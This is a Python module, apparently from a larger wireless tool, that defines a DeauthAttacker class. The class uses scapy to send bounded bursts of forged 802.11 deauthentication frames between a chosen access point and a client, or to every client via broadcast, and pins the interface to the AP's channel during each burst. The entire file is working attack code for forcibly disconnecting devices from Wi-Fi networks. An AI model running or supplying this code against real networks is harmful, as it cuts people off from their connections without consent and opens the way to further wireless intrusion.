import time

from scapy.layers.dot11 import RadioTap, Dot11, Dot11Deauth
from scapy.sendrecv import sendp

BROADCAST = "ff:ff:ff:ff:ff:ff"


class DeauthAttacker:
    """Sends a bounded burst of deauthentication frames at one AP/client
    pair, pinning the monitor-mode interface to the AP's channel for the
    duration so the channel hopper doesn't pull it away mid-burst."""

    def __init__(self, interface_manager, seen_aps, deauth_events, channel_state):
        self.interface_manager = interface_manager
        self.seen_aps = seen_aps
        self.deauth_events = deauth_events
        self.channel_state = channel_state

    def send_deauth(self, bssid, client_mac=None, count=20, inter=0.1):
        ap_info = self.seen_aps.get(bssid)
        if ap_info is None:
            raise ValueError(f"Unknown AP: {bssid}")

        target = client_mac or BROADCAST

        self.channel_state.paused.set()
        try:
            if ap_info.get("channel"):
                self.interface_manager.set_channel(ap_info["channel"])

            # AP -> client and client -> AP, so both sides drop the association
            frames = [
                RadioTap() / Dot11(addr1=target, addr2=bssid, addr3=bssid) / Dot11Deauth(reason=7),
                RadioTap() / Dot11(addr1=bssid, addr2=target, addr3=bssid) / Dot11Deauth(reason=7),
            ]
            sendp(frames, iface=self.interface_manager.iface, count=count, inter=inter, verbose=False)
        finally:
            self.channel_state.paused.clear()

        self.deauth_events.append({
            'time': time.time(),
            'src': bssid,
            'dst': target,
            'bssid': bssid,
            'source': 'self',
            'count': count * 2
        })
